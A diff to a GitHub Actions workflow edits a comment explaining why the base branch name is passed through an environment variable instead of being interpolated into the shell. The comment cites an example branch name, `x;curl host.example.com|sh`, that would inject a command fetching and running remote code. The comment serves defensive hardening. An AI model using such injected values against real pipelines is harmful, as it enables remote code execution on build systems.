@@ -30,8 +30,7 @@ jobs:
           # Never interpolated into the shell. Git permits `;`, `$`, `(`, `)`, `|` and
           # backticks in a ref name, so a branch called `x;curl host.example.com|sh` would
           # become two commands here. Actions substitutes expressions before bash parses
-          # anything; reading the value from the environment removes that path entirely,
-          # which is the rule `autonomous-triage.yml` already applies to an issue body.
+          # anything; reading the value from the environment removes that path entirely.
           BASE_REF: ${{ github.base_ref }}
         run: |
           git diff --name-only "origin/${BASE_REF}...HEAD" | grep '\.py$' > /tmp/changed_py_files.txt || true
